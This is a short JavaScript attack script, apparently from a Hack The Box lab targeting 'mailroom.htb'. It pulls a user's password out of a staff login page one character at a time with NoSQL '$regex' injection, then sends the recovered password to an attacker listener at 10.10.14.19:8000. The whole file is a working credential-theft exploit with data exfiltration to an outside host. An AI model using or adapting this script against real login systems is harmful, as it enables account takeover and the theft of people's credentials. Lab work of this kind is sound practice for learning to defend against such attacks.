var x = new XMLHttpRequest();
var r = new XMLHttpRequest();
var charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#=_<>";
var email = "email=tristan%40mailroom.htb";
var leaked = "";
for (var i = 0; i < charset.length; i++) {
    var password = "password[$regex]="+leaked+charset.charAt(i)+".*";
    var body = email + "&" + password;
    // send injection
    x.open("POST", "http://staff-review-panel.mailroom.htb/auth.php", false);
    x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    x.send(body);
    // if response is 130 (ok) store the character as part of the know password
    if (x.responseText.length === 130) {
        leaked += charset.charAt(i);
        // if match is found reset the loop
        i = 0;
    }
    // send the leaked password to local
    r.open("GET", "http://10.10.14.19:8000/"+leaked);
    r.send();
}